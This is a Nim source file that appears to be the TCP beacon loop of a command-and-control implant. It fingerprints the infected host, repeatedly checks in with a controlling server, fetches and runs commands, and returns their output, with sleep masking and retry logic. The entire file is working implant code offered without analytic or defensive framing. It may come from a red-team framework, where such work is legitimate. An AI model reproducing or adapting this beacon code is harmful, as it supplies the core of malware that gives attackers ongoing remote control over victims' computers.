import ../utils/global
import ../utils/network/tcp as ntcp
import ../utils/network/relay_packet
import ../utils/tasks/utils as tasks
import ../utils/actions/fingerprint
import ../capabilities/sleep/core

proc returnOutput() =
  # Sends pending task output and retries until the send works
  if not tasks.check_output():
    return
  var batch = tasks.get_output()
  var sent = ntcp.sendBatch(batch)
  while not sent.ok:
    sleep_now()
    sendFingerprint()
    sent = ntcp.sendBatch(batch)
  batch.setLen(0)
  if isMissingHostResponse(sent.body):
    sendFingerprint()
  tasks.clear_tasks(sent.ok, sent.body)

proc main*(): void =
  # Main loop of the tcp channel that checks in, runs tasks, and returns output
  sendFingerprint()
  while true:
    var boot = ntcp.sendRequest(hostTag)
    while not boot.ok:
      sleep_now()
      boot = ntcp.sendRequest(hostTag)
    if boot.code == 200:
      break
    elif isMissingHostResponse(boot.body):
      sendFingerprint()
    sleep_now()

  while true:
    returnOutput()
    sleep_now()
    var resp = ntcp.sendRequest(hostTag)
    while not resp.ok:
      sleep_now()
      sendFingerprint()
      resp = ntcp.sendRequest(hostTag)
    if isMissingHostResponse(resp.body):
      sendFingerprint()
    elif hasCommands(resp):
      discard ensureReady()
      tasks.run_command(resp.body)
      returnOutput()
    if secondDelayEnabled:
      sleep_now(secondDelay, skipSleepMask = true)
      returnOutput()
